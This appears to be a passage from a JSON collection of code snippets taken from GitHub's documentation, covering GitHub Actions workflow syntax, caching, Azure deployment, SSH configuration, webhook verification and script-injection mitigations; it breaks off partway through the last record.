[
  {
    "owner": "github",
    "repo": "docs",
    "content": "TITLE: Checking SSH Connection Details with Verbose Output\nDESCRIPTION: This snippet checks the connection details for SSH, and provides verbose output for debugging purposes. This helps in diagnosing why the SSH connection might be failing, especially in scenarios related to key authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nssh -vT git@{% data variables.product.product_url %}\n```\n\n----------------------------------------\n\nTITLE: Specifying Working Directory (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to specify the working directory for a `run` step in a GitHub Actions workflow using the `working-directory` keyword. The specified directory will be used as the current working directory when the command is executed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Clean temp directory\n  run: rm -rf *\n  working-directory: ./temp\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Steps\nDESCRIPTION: This YAML snippet illustrates defining workflow steps within a job using `jobs.<job_id>.steps`.  It demonstrates setting environment variables for a specific step and executing a shell command using `run`. The example prints a greeting using the defined environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nname: Greeting from Mona\n\non: push\n\njobs:\n  my-job:\n    name: My Job\n    runs-on: ubuntu-latest\n    steps:\n      - name: Print a greeting\n        env:\n          MY_VAR: Hi there! My name is\n          FIRST_NAME: Mona\n          MIDDLE_NAME: The\n          LAST_NAME: Octocat\n        run: |\n          echo $MY_VAR $FIRST_NAME $MIDDLE_NAME $LAST_NAME.\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow with ESLint Analysis\nDESCRIPTION: This workflow demonstrates running ESLint static analysis and uploading the resulting SARIF file to GitHub Code Scanning. It runs on every push and is scheduled to run weekly. The `Run ESLint` step generates the `results.sarif` file, which is then uploaded using the `github/codeql-action/upload-sarif` action. This workflow provides an example of integrating a third-party analysis tool into a GitHub Actions workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/uploading-a-sarif-file-to-github.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: \"ESLint analysis\"\n\n# Run workflow each time code is pushed to your repository and on a schedule.\n```\n\n----------------------------------------\n\nTITLE: Masking an environment variable in YAML using Bash\nDESCRIPTION: This snippet shows how to mask the value of an environment variable using the `add-mask` command within a GitHub Actions workflow defined in YAML using Bash. It sets an environment variable and then masks its value when it's echoed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  bash-example:\n    runs-on: ubuntu-latest\n    env:\n      MY_NAME: \"Mona The Octocat\"\n    steps:\n      - name: bash-version\n        run: echo \"::add-mask::$MY_NAME\"\n```\n\n----------------------------------------\n\nTITLE: Testing PowerShell with Pester in a GitHub Actions Workflow (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that runs Pester tests on an Ubuntu runner. It checks out the repository code and executes a Pester test by verifying the presence of a file and running tests defined in a `Unit.Tests.ps1` file using `Invoke-Pester`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Test PowerShell on Ubuntu\non: push\n\njobs:\n  pester-test:\n    name: Pester test\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Perform a Pester test from the command-line\n        shell: pwsh\n        run: Test-Path resultsfile.log | Should -Be $true\n      - name: Perform a Pester test from the Tests.ps1 file\n        shell: pwsh\n        run: |\n          Invoke-Pester Unit.Tests.ps1 -Passthru\n```\n\n----------------------------------------\n\nTITLE: Publish to npmjs Workflow - YAML\nDESCRIPTION: This workflow publishes a package to npmjs upon a release event. It sets up the environment for publishing with Yarn, using the NPM_TOKEN secret for authentication. The setup-node action configures the registry URL for npmjs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: Publish Package to npmjs\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      # Setup .npmrc file to publish to npm\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n          registry-url: 'https://registry.npmjs.org'\n          # Defaults to the user or organization that owns the workflow file\n          scope: '@octocat'\n      - run: yarn\n      - run: yarn npm publish // for Yarn version 1, use `yarn publish` instead\n        env:\n          NODE_AUTH_TOKEN: {% raw %}${{ secrets.NPM_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_COMMIT_REF_NAME to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_COMMIT_REF_NAME` to the GitHub Actions equivalent `${{ github.ref }}`. This variable is also similar to `CI_COMMIT_BRANCH`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_18\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.ref }}\n```\n\n----------------------------------------\n\nTITLE: SSH Configuration for multiple repositories with deploy keys\nDESCRIPTION: This snippet shows how to configure the SSH config file (~/.ssh/config) to handle multiple repositories using dedicated deploy keys. It defines alias entries for each repository, specifying the hostname and the path to the corresponding private key. This allows using different deploy keys for different repositories on the same server.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/managing-deploy-keys.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nHost {% ifversion fpt or ghec %}github.com{% else %}my-GHE-hostname.com{% endif %}-repo-0\n        Hostname {% ifversion fpt or ghec %}github.com{% else %}my-GHE-hostname.com{% endif %}\n        IdentityFile=/home/user/.ssh/repo-0_deploy_key\n\nHost {% ifversion fpt or ghec %}github.com{% else %}my-GHE-hostname.com{% endif %}-repo-1\n        Hostname {% ifversion fpt or ghec %}github.com{% else %}my-GHE-hostname.com{% endif %}\n        IdentityFile=/home/user/.ssh/repo-1_deploy_key\n```\n\n----------------------------------------\n\nTITLE: Triggering merge group checks with GitHub Actions using YAML\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to trigger on both `pull_request` and `merge_group` events. This ensures that checks are run both when a pull request is created/updated and when it is added to a merge queue. It's crucial for properly integrating with merge queues, as the `merge_group` event signifies a pull request's inclusion in the queue.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/configuring-branches-and-merges-in-your-repository/configuring-pull-request-merges/managing-a-merge-queue.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request:\n  merge_group:\n```\n\n----------------------------------------\n\nTITLE: Caching npm modules with GitHub Actions cache\nDESCRIPTION: This YAML workflow snippet configures caching for npm modules in a GitHub Actions workflow. It defines a job that runs on Ubuntu, checks out code, caches node modules using the `actions/cache` action, installs dependencies, builds the project, and runs tests. The cache key is generated based on the runner's OS, a cache name, and the hash of the `package-lock.json` file. Restore keys are also used to improve cache hit rates.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: Caching with npm\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Cache node modules\n        id: cache-npm\n        uses: {% data reusables.actions.action-cache %}\n        env:\n          cache-name: cache-node-modules\n        with:\n          # npm cache files are stored in `~/.npm` on Linux/macOS\n          path: ~/.npm\n          key: {% raw %}${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n          restore-keys: |\n            {% raw %}${{ runner.os }}-build-${{ env.cache-name }}-{% endraw %}\n            {% raw %}${{ runner.os }}-build-{% endraw %}\n            {% raw %}${{ runner.os }}-{% endraw %}\n\n      - if: {% raw %}${{ steps.cache-npm.outputs.cache-hit != 'true' }}{% endraw %}\n        name: List the state of node modules\n        continue-on-error: true\n        run: npm list\n\n      - name: Install dependencies\n        run: npm install\n\n      - name: Build\n        run: npm run build\n\n      - name: Test\n        run: npm test\n```\n\n----------------------------------------\n\nTITLE: Mitigation: Using a Dedicated Action - YAML\nDESCRIPTION: This YAML snippet demonstrates the recommended approach to mitigate script injection by using a dedicated action. Instead of directly embedding the expression in a shell script, the pull request title is passed as an argument to the action. The `fakeaction/checktitle@v3` action processes the title without creating a vulnerable shell script, preventing injection attacks.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nuses: fakeaction/checktitle@v3\nwith:\n    title: {% raw %}${{ github.event.pull_request.title }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Executing a shell script in GitHub Actions YAML\nDESCRIPTION: This snippet demonstrates how to execute a shell script within a GitHub Actions workflow. It specifies the script's path and explicitly sets the shell to `bash`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Run build script\n    run: ./.github/scripts/build.sh\n    shell: bash\n```\n\n----------------------------------------\n\nTITLE: Defining environment variables in a GitHub Actions workflow\nDESCRIPTION: This snippet demonstrates how to define environment variables at the workflow, job, and step levels within a GitHub Actions workflow file. It shows how to use the `env` key to set variables and how to access these variables in a `run` step using shell syntax.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Greeting on variable day\n\non:\n  workflow_dispatch\n\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona\n```\n\n----------------------------------------\n\nTITLE: Define Java CI Workflow with Gradle\nDESCRIPTION: This workflow configuration defines a CI pipeline for Java projects using Gradle. It triggers on push events to the `main` branch and pull requests targeting the `main` branch. It sets up a Java environment with JDK 17 and uses Gradle to build the project. The workflow runs on Ubuntu.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Java CI with Gradle\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Set up JDK 17\n      uses: {% data reusables.actions.action-setup-java %}\n      with:\n        java-version: '17'\n        distribution: 'temurin'\n\n    - name: Setup Gradle\n      uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n    - name: Build with Gradle\n      run: ./gradlew build\n```\n\n----------------------------------------\n\nTITLE: Pushing a Branch to a Remote Repository with Git\nDESCRIPTION: This command pushes the commits made on a local branch to a remote repository. It requires specifying the remote name (e.g., `origin`) and the branch name (e.g., `main`).  The changes are uploaded to the specified branch on the remote.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/pushing-commits-to-a-remote-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit push REMOTE-NAME BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Inputs for Reusable Workflows\nDESCRIPTION: This YAML snippet demonstrates how to define inputs for a reusable workflow using `on.workflow_call.inputs`. It specifies the input's description, default value, whether it's required, and its data type (string in this case).  The `username` input can be accessed within the workflow using the `inputs` context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_call:\n    inputs:\n      username:\n        description: 'A username passed from the caller workflow'\n        default: 'john-doe'\n        required: false\n        type: string\n\njobs:\n  print-username:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Print the input name to STDOUT\n        run: echo The username is ${{ inputs.username }}\n```\n\n----------------------------------------\n\nTITLE: Adding Alerts in Markdown\nDESCRIPTION: This snippet demonstrates how to add alerts to Markdown content using a special blockquote syntax. It provides examples for five different alert types: NOTE, TIP, IMPORTANT, WARNING, and CAUTION, each with its own specific message.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_15\n\nLANGUAGE: markdown\nCODE:\n```\n> [!NOTE]\n> Useful information that users should know, even when skimming content.\n\n> [!TIP]\n> Helpful advice for doing things better or more easily.\n\n> [!IMPORTANT]\n> Key information users need to know to achieve their goal.\n\n> [!WARNING]\n> Urgent info that needs immediate user attention to avoid problems.\n\n> [!CAUTION]\n> Advises about risks or negative outcomes of certain actions.\n```\n\n----------------------------------------\n\nTITLE: Generating SBOM Attestation for Container Images with GitHub Actions\nDESCRIPTION: This snippet shows how to use the `actions/attest-sbom` action to generate an attestation for an SBOM associated with a container image. The `subject-name` specifies the fully-qualified image name, `subject-digest` provides the SHA256 digest of the image, and `sbom-path` provides the path to the SBOM file. The `push-to-registry` parameter is used to push the attestation to the registry.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Generate SBOM attestation\n  uses: actions/attest-sbom@v1\n  with:\n    subject-name: {% raw %}${{ env.REGISTRY }}/PATH/TO/IMAGE{% endraw %}\n    subject-digest: 'sha256:fedcba0...'\n    sbom-path: 'sbom.json'\n    push-to-registry: true\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on milestone events in YAML\nDESCRIPTION: This YAML snippet configures a GitHub workflow to trigger when a `milestone` event occurs, specifically when the `opened` or `deleted` activity types are initiated. The workflow uses the `on` keyword to specify the trigger event and its types, which are `opened` and `deleted` in this case.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  milestone:\n    types: [opened, deleted]\n```\n\n----------------------------------------\n\nTITLE: Removing Sensitive Data with git filter-repo\nDESCRIPTION: This snippet shows the recommended tool `git filter-repo` for removing sensitive data from a repository's history after it has been pushed. It is crucial to ensure that the data is completely removed and is no longer accessible.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/getting-started/best-practices-for-preventing-data-leaks-in-your-organization.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit filter-repo\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull requests with changes to specific files (YAML)\nDESCRIPTION: This snippet demonstrates how to configure a GitHub Actions workflow to run only when a pull request includes a change to a JavaScript file (`.js`). It uses the `paths` filter.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_25\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request:\n    paths:\n      - '**.js'\n```\n\n----------------------------------------\n\nTITLE: Configuring devcontainer.json for React Template\nDESCRIPTION: This JSON snippet configures a `devcontainer.json` file for a React template in GitHub Codespaces. It automatically opens `src/App.js`, runs `npm start` to launch a local server, and forwards port 3000 to a preview browser tab. This allows users to immediately see their React application running when the codespace is created.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/setting-up-your-repository/setting-up-a-template-repository-for-github-codespaces.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"postAttachCommand\": {\n      \"server\": \"npm start\"\n    },\n\n    \"portsAttributes\": {\n      \"3000\": {\n        \"label\": \"Application\",\n        \"onAutoForward\": \"openPreview\"\n      }\n    },\n\n    \"customizations\": {\n      \"codespaces\": {\n        \"openFiles\": [\"src/App.js\"]\n      }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Verifying Webhook Signature with Ruby\nDESCRIPTION: This Ruby code snippet defines a `verify_signature` function that calculates the expected HMAC SHA256 signature using a secret token and compares it to the `X-Hub-Signature-256` header from the webhook request. It uses `OpenSSL` for HMAC calculation and `Rack::Utils.secure_compare` for secure string comparison to prevent timing attacks. The function halts with a 500 error if signatures don't match. It also shows how to read the payload and call the verify_signature function.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/validating-webhook-deliveries.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\ndef verify_signature(payload_body)\n  signature = 'sha256=' + OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('sha256'), ENV['SECRET_TOKEN'], payload_body)\n  return halt 500, \"Signatures didn't match!\" unless Rack::Utils.secure_compare(signature, request.env['HTTP_X_HUB_SIGNATURE_256'])\nend\n\npost '/payload' do\n  request.body.rewind\n  payload_body = request.body.read\n  verify_signature(payload_body)\n  push = JSON.parse(payload_body)\n  \"I got some JSON: #{push.inspect}\"\nend\n```\n\n----------------------------------------\n\nTITLE: Routing Workflows with Labels in GitHub Actions (YAML)\nDESCRIPTION: This snippet shows how to use labels to route workflows to specific runners in GitHub Actions. The `runs-on` array specifies the required labels for a runner to execute the job. This ensures that the job is executed on a runner that meets the specified requirements (e.g., self-hosted, linux, x64, gpu).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/about-workflows.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  example-job:\n    runs-on: [self-hosted, linux, x64, gpu]\n```\n\n----------------------------------------\n\nTITLE: Build and test .NET code\nDESCRIPTION: This workflow shows how to build and test a .NET project. It restores dependencies, builds the project using `dotnet build`, and runs tests using `dotnet test`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Setup dotnet\n  uses: {% data reusables.actions.action-setup-dotnet %}\n  with:\n    dotnet-version: '6.0.x'\n- name: Install dependencies\n  run: dotnet restore\n- name: Build\n  run: dotnet build --no-restore\n- name: Test with the dotnet CLI\n  run: dotnet test --no-build\n```\n\n----------------------------------------\n\nTITLE: Build and deploy to Azure Kubernetes Service\nDESCRIPTION: This workflow demonstrates building and deploying a project to Azure Kubernetes Service (AKS) when code is pushed to the repository. It utilizes Azure-specific GitHub Actions to log in, build the image, configure Kubernetes context, bake configurations, and deploy the application.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-azure-kubernetes-service.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Build and deploy to Azure Kubernetes Service\n\nenv:\n  AZURE_CONTAINER_REGISTRY: MY_REGISTRY_NAME # set this to the name of your container registry\n  PROJECT_NAME: MY_PROJECT_NAME              # set this to your project's name\n  RESOURCE_GROUP: MY_RESOURCE_GROUP          # set this to the resource group containing your AKS cluster\n  CLUSTER_NAME: MY_CLUSTER_NAME              # set this to the name of your AKS cluster\n  REGISTRY_URL: MY_REGISTRY_URL              # set this to the URL of your registry\n  # If you bake using helm:\n  CHART_PATH: MY_HELM_FILE                   # set this to the path to your helm file\n  CHART_OVERRIDE_PATH: MY_OVERRIDE_FILES     # set this to an array of override file paths\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n\n    - name: Azure Login\n      uses: azure/login@14a755a4e2fd6dff25794233def4f2cf3f866955\n      with:\n        creds: {% raw %}${{ secrets.AZURE_CREDENTIALS }}{% endraw %}\n\n    - name: Build image on ACR\n      uses: azure/CLI@61bb69d64d613b52663984bf12d6bac8fd7b3cc8\n      with:\n        azcliversion: 2.29.1\n        inlineScript: |\n          az configure --defaults acr={% raw %}${{ env.AZURE_CONTAINER_REGISTRY }}{% endraw %}\n          az acr build -t -t {% raw %}${{ env.REGISTRY_URL }}{% endraw %}/{% raw %}${{ env.PROJECT_NAME }}{% endraw %}:{% raw %}${{ github.sha }}{% endraw %}\n\n    - name: Gets K8s context\n      uses: azure/aks-set-context@94ccc775c1997a3fcfbfbce3c459fec87e0ab188\n      with:\n          creds: {% raw %}${{ secrets.AZURE_CREDENTIALS }}{% endraw %}\n          resource-group: {% raw %}${{ env.RESOURCE_GROUP }}{% endraw %}\n          cluster-name: {% raw %}${{ env.CLUSTER_NAME }}{% endraw %}\n      id: login\n\n    - name: Configure deployment\n      uses: azure/k8s-bake@61041e8c2f75c1f01186c8f05fb8b24e1fc507d8\n      with:\n        renderEngine: 'helm'\n        helmChart: {% raw %}${{ env.CHART_PATH }}{% endraw %}\n        overrideFiles: {% raw %}${{ env.CHART_OVERRIDE_PATH }}{% endraw %}\n        overrides: |\n          replicas:2\n        helm-version: 'latest'\n      id: bake\n\n    - name: Deploys application\n      uses: Azure/k8s-deploy@dd4bbd13a5abd2fc9ca8bdcb8aee152bb718fa78\n      with:\n        manifests: {% raw %}${{ steps.bake.outputs.manifestsBundle }}{% endraw %}\n        images: |\n          {% raw %}${{ env.AZURE_CONTAINER_REGISTRY }}{% endraw %}.azurecr.io/{% raw %}${{ env.PROJECT_NAME }}{% endraw %}:{% raw %}${{ github.sha }}{% endraw %}\n        imagepullsecrets: |\n          {% raw %}${{ env.PROJECT_NAME }}{% endraw %}\n\n```\n\n----------------------------------------\n\nTITLE: Calling Workflow and Using Outputs\nDESCRIPTION: This YAML snippet demonstrates calling a reusable workflow and using its outputs in a subsequent job. The `needs` keyword ensures the calling workflow finishes before the job using its outputs starts. It then accesses the output values using the `needs.<job_id>.outputs.<output_name>` syntax.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_10\n\nLANGUAGE: YAML\nCODE:\n```\nname: Call a reusable workflow and use its outputs\n\non:\n  workflow_dispatch:\n\njobs:\n  job1:\n    uses: octo-org/example-repo/.github/workflows/called-workflow.yml@v1\n\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1\n    steps:\n      - run: echo ${{ needs.job1.outputs.firstword }} ${{ needs.job1.outputs.secondword }}\n```\n\n----------------------------------------\n\nTITLE: Setting JSON Matrix Output in GitHub Actions\nDESCRIPTION: This YAML workflow defines a job that sets a JSON matrix as an output. This matrix is then used in a subsequent job using the `fromJSON` function within the `strategy` matrix configuration. It showcases how to dynamically configure job execution based on a matrix defined in a previous job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nname: build\non: push\njobs:\n  job1:\n    runs-on: ubuntu-latest\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n    steps:\n      - id: set-matrix\n        run: echo \"matrix={\\\"include\\\":[{\\\"project\\\":\\\"foo\\\",\\\"config\\\":\\\"Debug\\\"},{\\\"project\\\":\\\"bar\\\",\\\"config\\\":\\\"Release\\\"}]}\" >> $GITHUB_OUTPUT\n  job2:\n    needs: job1\n    runs-on: ubuntu-latest\n    strategy:\n      matrix: ${{ fromJSON(needs.job1.outputs.matrix) }}\n    steps:\n      - run: echo \"Matrix - Project ${{ matrix.project }}, Config ${{ matrix.config }}\"\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for Node.js to Azure App Service\nDESCRIPTION: This YAML file defines a GitHub Actions workflow for building, testing, and deploying a Node.js application to Azure App Service. It triggers on pushes to the `main` branch.  The workflow defines environment variables for the web app name, package path, and Node.js version. The workflow consists of build and deploy jobs that run on ubuntu-latest.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-nodejs-to-azure-app-service.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\non:\n  push:\n    branches:\n      - main\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  AZURE_WEBAPP_PACKAGE_PATH: '.'      # set this to the path to your web app project, defaults to the repository root\n  NODE_VERSION: '14.x'                # set this to the node version to use\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n\n    - name: Set up Node.js\n      uses: {% data reusables.actions.action-setup-node %}\n      with:\n        node-version: {% raw %}${{ env.NODE_VERSION }}{% endraw %}\n        cache: 'npm'\n\n    - name: npm install, build, and test\n      run: |\n        npm install\n        npm run build --if-present\n        npm run test --if-present\n    - name: Upload artifact for deployment job\n      uses: {% data reusables.actions.action-upload-artifact %}\n      with:\n        name: node-app\n        path: .\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: {% raw %}${{ steps.deploy-to-webapp.outputs.webapp-url }}{% endraw %}\n\n    steps:\n    - name: Download artifact from build job\n      uses: {% data reusables.actions.action-download-artifact %}\n      with:\n        name: node-app\n\n    - name: 'Deploy to Azure WebApp'\n      id: deploy-to-webapp\n      uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n      with:\n        app-name: {% raw %}${{ env.AZURE_WEBAPP_NAME }}{% endraw %}\n        publish-profile: {% raw %}${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}{% endraw %}\n        package: {% raw %}${{ env.AZURE_WEBAPP_PACKAGE_PATH }}{% endraw %}\n\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Jobs with Different Operating Systems (YAML)\nDESCRIPTION: This YAML workflow configuration defines two jobs: one that runs npm commands on an Ubuntu VM and another that runs PSScriptAnalyzer on a Windows VM. It demonstrates how to use the `runs-on` keyword to specify the operating system for each job, utilizing GitHub-hosted runners.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/using-github-hosted-runners/about-github-hosted-runners.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Run commands on different operating systems\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  Run-npm-on-Ubuntu:\n    name: Run npm on Ubuntu\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '14'\n      - run: npm help\n\n  Run-PSScriptAnalyzer-on-Windows:\n    name: Run PSScriptAnalyzer on Windows\n    runs-on: windows-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Install PSScriptAnalyzer module\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module PSScriptAnalyzer -ErrorAction Stop\n      - name: Get list of rules\n        shell: pwsh\n        run: |\n          Get-ScriptAnalyzerRule\n```\n\n----------------------------------------\n\nTITLE: Referencing Major Release Tag in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet demonstrates how to reference a major release tag when using an action in a GitHub Actions workflow.  Referencing major release tags ensures users receive updates within the same major version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/about-custom-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    - uses: actions/javascript-action@v1\n```\n\n----------------------------------------\n\nTITLE: Cleanup Caches by Branch Workflow - YAML\nDESCRIPTION: This workflow is triggered when a pull request is closed and deletes up to 100 caches created by the branch associated with the pull request. It uses the `gh cache` command-line tool to list and delete caches.  The workflow includes setting environment variables for authentication and repository context. It uses the GITHUB_TOKEN secret for authentication with the GitHub CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nname: cleanup caches by a branch\non:\n  pull_request:\n    types:\n      - closed\n\njobs:\n  cleanup:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Cleanup\n        run: |\n          echo \"Fetching list of cache key\"\n          cacheKeysForPR=$(gh cache list --ref $BRANCH --limit 100 --json id --jq '.[].id')\n\n          ## Setting this to not fail the workflow while deleting cache keys.\n          set +e\n          echo \"Deleting caches...\"\n          for cacheKey in $cacheKeysForPR\n          do\n              gh cache delete $cacheKey\n          done\n          echo \"Done\"\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          GH_REPO: {% raw %}${{ github.repository }}{% endraw %}\n          BRANCH: refs/pull/{% raw %}${{ github.event.pull_request.number }}{% endraw %}/merge\n```\n\n----------------------------------------\n\nTITLE: Mitigation: Using an Environment Variable - YAML\nDESCRIPTION: This YAML snippet demonstrates using an intermediate environment variable to mitigate script injection vulnerabilities. It assigns the value of the expression `github.event.pull_request.title` to the `TITLE` environment variable. 